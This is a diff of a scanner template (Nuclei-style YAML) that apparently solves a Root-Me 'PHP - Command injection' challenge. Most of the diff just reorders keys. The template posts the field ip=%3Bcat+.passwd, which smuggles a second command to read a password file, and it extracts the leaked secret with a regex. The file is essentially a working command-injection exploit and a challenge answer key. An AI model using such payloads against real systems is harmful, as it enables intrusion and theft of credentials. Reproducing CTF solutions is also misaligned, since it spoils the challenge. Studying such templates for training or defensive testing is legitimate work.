@@ -1,33 +1,31 @@
 id: PHP-Commandinjection
-
 info:
-  name: PHP - Command injection
   author: Tomitom13
+  name: PHP - Command injection
   severity: unknown
   tags: command-injection,php,rootme
-
 requests:
-  - raw:
-      - |
-        POST / HTTP/1.1
-        Content-Type: application/x-www-form-urlencoded
+- extractors:
+  - name: password
+    part: body
+    regex:
+    - S[a-zA-Z0-9!@#$%^&*()_+,.?]+re
+    type: regex
+  matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    regex:
+    - S[a-zA-Z0-9!@#$%^&*()_+,.?]+re
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'POST / HTTP/1.1
 
-        ip=%3Bcat+.passwd
+    Content-Type: application/x-www-form-urlencoded
 
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
 
-      - type: regex
-        regex:
-          - "S[a-zA-Z0-9!@#$%^&*()_+,.?]+re"
-        part: body
+    ip=%3Bcat+.passwd
 
-    extractors:
-      - type: regex
-        name: password
-        part: body
-        regex:
-          - "S[a-zA-Z0-9!@#$%^&*()_+,.?]+re"
+    '
